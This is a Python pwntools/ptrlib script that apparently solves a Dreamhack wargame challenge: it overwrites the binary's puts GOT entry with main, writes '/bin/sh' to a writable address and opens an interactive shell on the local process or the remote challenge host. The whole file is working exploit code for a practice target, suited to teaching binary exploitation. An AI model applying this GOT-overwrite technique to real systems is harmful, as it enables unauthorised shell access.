#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./prob_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 18640)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    puts_got = unwrap(exe.got("puts"))
    writable_system_rdi = 0x404080
    main = unwrap(exe.symbol("main"))

    io.sendlineafter(b"pt: ", str(puts_got).encode())
    io.sendlineafter(b"input: ", ptr.p64(main))
    io.sendlineafter(b"pt: ", str(writable_system_rdi).encode())
    io.sendlineafter(b"input: ", b"/bin/sh\0")

    io.interactive()
    return


if __name__ == "__main__":
    main()
